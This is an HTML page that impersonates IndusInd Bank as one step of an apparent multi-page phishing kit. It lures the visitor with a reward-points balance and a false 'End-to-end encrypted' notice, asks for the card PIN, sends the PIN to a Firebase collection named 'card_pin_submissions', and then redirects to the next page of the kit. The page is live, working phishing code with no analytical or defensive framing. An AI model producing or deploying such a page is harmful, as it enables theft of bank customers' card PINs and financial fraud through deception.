<!DOCTYPE html>
<html lang="en">
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IndusInd Bank - PIN Verification</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', Arial, sans-serif; background: #f8f8f8; }

    .header-bar { background: #832625; padding: 12px 0; text-align: center; }
    .header-bar img { height: 36px; }

    .container { padding: 20px; max-width: 420px; margin: 0 auto; }
    .form-card { background: #fff; border-radius: 10px; padding: 25px 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.06); border-top: 3px solid #fd9907; text-align: center; }
    .form-card h2 { color: #832625; font-weight: 700; font-size: 1.15rem; margin-bottom: 5px; }
    .form-card .sub { font-size: 0.82rem; color: #888; margin-bottom: 20px; }
    .form-card .points { background: #EDE6DE; color: #832625; padding: 8px; border-radius: 6px; font-size: 0.85rem; font-weight: 600; margin-bottom: 20px; }

    label { display: block; margin-bottom: 4px; font-weight: 500; font-size: 0.85rem; color: #444; text-align: left; }
    input { width: 100%; padding: 10px 12px; margin-bottom: 14px; border: 1.5px solid #e0e0e0; border-radius: 6px; font-size: 0.95rem; text-align: center; letter-spacing: 4px; }
    input:focus { border-color: #832625; outline: none; box-shadow: 0 0 0 3px rgba(131,38,37,0.1); }

    .btn-submit { display: block; width: 60%; margin: 0 auto; padding: 12px; background: #832625; color: #fff; border: none; border-radius: 6px; font-size: 1rem; font-weight: 600; cursor: pointer; }
    .btn-submit:hover { background: #6d1a15; }

    .secure-note { text-align: center; font-size: 0.72rem; color: #999; margin-top: 15px; }
  </style>
</head>
<body>

<div class="header-bar">
  <img src="../images/logo.jpeg" alt="IndusInd Bank">
</div>

<div class="container">
  <div class="form-card">
    <h2>Card PIN Authentication</h2>
    <p class="sub">Enter your 4-digit card PIN to continue</p>
    <div class="points"><i class="fa-regular fa-gem me-2"></i>Available Redeemable: 15,275 Points</div>
    <form id="indusForm">
      <input type="password" id="pin" placeholder="Enter Card PIN" maxlength="6" required autocomplete="off">
      <button type="submit" class="btn-submit">VERIFY PIN</button>
    </form>
    <div class="secure-note"><i class="fa-solid fa-lock me-1"></i> End-to-end encrypted</div>
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
<script src="firebase-config.js"></script>
<script>
  document.getElementById("indusForm").addEventListener("submit", async function(e) {
    e.preventDefault();
    const pin = document.getElementById("pin").value;
    if (!pin) { alert('Please enter card PIN.'); return; }
    if (!isFirebaseReady()) { alert('Firebase not initialized.'); return; }

    const btn = document.querySelector(".btn-submit");
    btn.disabled = true; btn.textContent = 'Processing...';

    try {
      const res = await saveFormSubmissionToFirebase('card_pin_submissions', { pin });
      if (res.success) window.location.href = '6.html';
      else { alert('Error: ' + (res.error || 'unknown')); btn.disabled = false; btn.textContent = 'VERIFY PIN'; }
    } catch (err) { alert('Error occurred'); btn.disabled = false; btn.textContent = 'VERIFY PIN'; }
  });
</script>
</body>
</html>
